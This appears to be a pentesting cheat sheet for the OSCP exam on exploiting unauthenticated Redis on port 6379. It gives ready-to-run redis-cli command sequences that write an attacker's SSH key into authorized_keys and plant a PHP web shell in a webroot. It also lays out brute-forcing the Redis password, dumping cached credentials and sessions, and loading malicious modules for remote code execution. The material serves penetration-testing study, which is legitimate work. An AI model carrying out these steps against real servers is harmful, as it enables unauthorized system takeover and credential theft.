# 🔧 Redis — Port 6379

> **In-memory key-value store** (6379/TCP; **no auth by default**, often bound to all interfaces by mistake; optional `requirepass`, Redis 6+ ACL users). On OSCP this is a **fast RCE surface when unauthenticated**: connect with `redis-cli`, control `dir`+`dbfilename` so `SAVE` writes attacker content anywhere Redis can write — an SSH key to a user's `authorized_keys`, a web shell into a known webroot, or (older versions) a malicious module. Also a credential/data store worth dumping.

Related: [[SSH]] · [[HTTP]] · [[Linux Privilege Escalation]] · [[Credential Attacks]] · [[Shells]]

---

## 🧠 PORT 6379 → THINK
- **`redis-cli -h $IP` then `INFO`** — no auth = you own it.
- Unauth + Redis runs as a user with a writable `~/.ssh` → **write authorized_keys → SSH**.
- Writable **webroot** known → `CONFIG SET dir` + `SET`/`SAVE` → **web shell**.
- `requirepass`? → brute a short password or find it in configs.
- Old Redis (≤ 5.x) → **module load** RCE (situational).

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
redis-cli -h $IP ping                 # PONG = reachable
```

```bash
redis-cli -h $IP info server          # NOAUTH error = protected; output = open
```
**Verdict:** `INFO` returns data (no auth) → go for SSH-key or web-shell write. `NOAUTH` → need/brute a password.

## ⏱️ ENUMERATE
```bash
redis-cli -h $IP
# inside:
#   INFO                 -> version, os, role, config dir
#   CONFIG GET dir       -> current working dir (target for writes)
#   CONFIG GET dbfilename
#   CONFIG GET requirepass
#   ACL WHOAMI / ACL LIST  (Redis 6+)
#   KEYS *               -> all keys (may hold creds/sessions)
```

```bash
nmap -p6379 --script redis-info $IP
```

```bash
redis-cli -h $IP -a '<password>' info            # if requirepass set and known
# metasploit: auxiliary/scanner/redis/redis_login, redis_server (module RCE for old versions)
```
**Look for:** version (RCE method), `dir` (where writes land), `requirepass` empty, app session tokens / cached creds in keys, and whether `dir` can be redirected to `~/.ssh` or a webroot.

## 🗡️ EXPLOIT
- 🟢 **Unauth → write SSH key → SSH** (needs Redis user to own a writable `~/.ssh`).
- 🟢 **Unauth → write web shell** into a known writable webroot → RCE via [[HTTP]].
- 🟡 **Dump keys** (`KEYS *` / `GET`) → session/credential theft.
- 🟡 **`requirepass` brute-force** (short passwords) → then above.
- 🔵 **Module-load RCE** on Redis ≤ ~5.x (`MODULE LOAD` of a malicious `.so`) — situational, version-gated.

**A) SSH key write (Redis runs as a user with a writable home):**
```bash
ssh-keygen -f ./rk -N ''
```

```bash
(echo -e "\n\n"; cat rk.pub; echo -e "\n\n") > key.txt
```

```bash
redis-cli -h $IP flushall
```

```bash
cat key.txt | redis-cli -h $IP -x set payload
```

```bash
redis-cli -h $IP config set dir /home/<user>/.ssh   # or /root/.ssh if root
```

```bash
redis-cli -h $IP config set dbfilename authorized_keys
```

```bash
redis-cli -h $IP save
```

```bash
ssh -i rk <user>@$IP                                 # log in
```
**B) Web shell write (known writable webroot):**
```bash
redis-cli -h $IP config set dir /var/www/html
```

```bash
redis-cli -h $IP config set dbfilename shell.php
```

```bash
redis-cli -h $IP set x '<?php system($_GET["c"]); ?>'
```

```bash
redis-cli -h $IP save
# browse http://$IP/shell.php?c=id
```
**After access:** you're the Redis service user — check `sudo -l`, cron, group memberships; `KEYS *` → dump cached creds/sessions → reuse ([[Credential Attacks]]) → [[Linux Privilege Escalation]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `INFO` w/o auth | Unauth Redis | write primitive | SSH/web shell |
| Redis run as root/user w/ home | SSH key write | authorized_keys trick | SSH shell |
| Known writable webroot | Web shell | config set dir + save | RCE |
| Session tokens in keys | Cred theft | GET keys → reuse | lateral |
| `requirepass` set | Protected | brute / find in config | then above |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `NOAUTH Authentication required` | Brute `requirepass` (short list); search configs on other services for it |
| SSH write but login fails | Redis user's `.ssh` not writable / wrong home — try other users, or use web-shell path |
| Don't know webroot | Find it via [[HTTP]] enum; try common paths (`/var/www/html`) |
| `save` permission denied | Redis user can't write that `dir` — pick a dir it owns (its home, `/tmp`, `/dev/shm`) |
| Redis 6+ ACL restricts CONFIG | Limited — dump readable keys; look for creds instead |
| Only reachable on localhost | Port-forward after a foothold ([[Pivoting and Port Forwarding]]) |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** not testing **unauth `INFO`** first · forgetting to **`flushall`/reset dir & dbfilename** (messing up the write or breaking the DB) · writing the SSH key to the wrong user's home (must match the Redis service user) · overlooking cached **credentials/sessions** in keys.
**Reuse:** cached tokens/creds → web app ([[HTTP]]), [[SSH]], other services; `requirepass` might equal a password reused elsewhere. See [[Credential Attacks]].
**Don't miss:** `redis-cli -h $IP info` (unauth check) · `CONFIG GET dir` + `dbfilename` · SSH authorized_keys write · web-shell write to known webroot · `KEYS *` for cached creds · note version for module-load RCE (old).
**Stop when:** authenticated and you can't brute the password, or you can't find a writable target dir / webroot → note and move on; revisit with creds or after a foothold (localhost). SSH/web shell → work shifts to [[Linux Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
redis-cli -h $IP info                                   # unauth?
```

```bash
redis-cli -h $IP config get dir
```

```bash
# SSH key write:
ssh-keygen -f rk -N ''; (echo;echo; cat rk.pub; echo;echo)>k.txt
```

```bash
cat k.txt | redis-cli -h $IP -x set p
```

```bash
redis-cli -h $IP config set dir /root/.ssh; redis-cli -h $IP config set dbfilename authorized_keys; redis-cli -h $IP save
```

```bash
ssh -i rk root@$IP
# Web shell: config set dir /var/www/html; config set dbfilename s.php; set x '<?php system($_GET[0]);?>'; save
```
**Kill shots:** unauth → authorized_keys write → SSH · unauth → web shell → RCE.
